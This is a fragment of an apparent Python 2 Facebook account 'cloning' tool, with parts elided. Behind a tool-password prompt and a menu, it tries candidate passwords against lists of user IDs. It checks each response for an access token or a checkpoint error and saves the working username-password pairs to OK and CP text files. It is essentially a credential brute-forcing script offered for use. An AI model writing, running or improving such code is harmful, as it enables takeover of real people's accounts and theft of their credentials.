...
loop = 'true'
while (loop == 'true'):
    username = raw_input('\033[1;97m[\033[1;92m•\033[1;91m•\033[1;97m] Tool Password :\033[1;92m ')
    if (username == CorrectUsername):
            print("")
    	    print("")
            print '\033[1;97m[\033[1;92m•\033[1;91m•\033[1;97m] \033[1;92mLogin Successfull'
            time.sleep(1)
...
def menu():
    ...
    print logo
    print
    jalan ('\x1b[1;97m[1] Start Cloning (\033[1;92mWithout Login\033[1;97m)')
    print
...
def action():
    global cpb
    global oks
    ss = raw_input('\x1b[1;97mChoose Optoin :   ')
    if ss == '':
        print '[!] Warning'
        action()
    elif ss == '1':
    ...
    os.system('clear')
    print logo
    print('    \x1b[1;92mTool is free clone without package')
    print(47*'\x1b[1;97m-')
    xxx = str(len(id))
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[92m[Younis - OK]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[Younis - CP] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[Younis - OK] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[Younis - CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/CP.txt', 'a')
